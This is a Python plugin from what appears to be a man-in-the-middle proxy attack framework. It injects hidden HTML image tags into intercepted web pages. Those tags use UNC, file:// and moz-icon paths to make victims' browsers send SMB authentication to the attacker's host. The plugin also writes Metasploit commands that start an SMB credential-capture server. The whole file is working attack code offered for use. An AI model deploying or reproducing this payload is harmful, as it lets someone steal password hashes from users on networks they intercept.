from plugins.sergio_proxy.plugins.plugin import Plugin
from plugins.sergio_proxy.plugins.Inject import Inject

class SMBAuth(Inject,Plugin):
    name = "SMBAuth"
    optname = "smbauth"
    desc = "Evoke SMB challenge-response auth attempt.\nInherits from Inject."
    def initialize(self,options):
        Inject.initialize(self,options)
        self.target_ip = options.msf_lhost
        self.html_payload = self._get_data()
        if options.start_auth_sniffer and options.msf_rc == "/tmp/tmp.rc":
            options.msf_user = "root"
            f = open(options.msf_rc,"a")
            f.write("use server/capture/smb\n")
            f.write("exploit -j\n")
            f.close()
    def add_options(self,options):
        options.add_argument("--start-auth-sniffer",action="store_true",
                help="Starts MSF and sets up the credentials sniffer.")
    def _get_data(self):
        return '<img src=\"\\\\%s\\image.jpg\">'\
                '<img src=\"file://///%s\\image.jpg\">'\
                '<img src=\"moz-icon:file:///%%5c/%s\\image.jpg\">'\
                    % tuple([self.target_ip]*3)
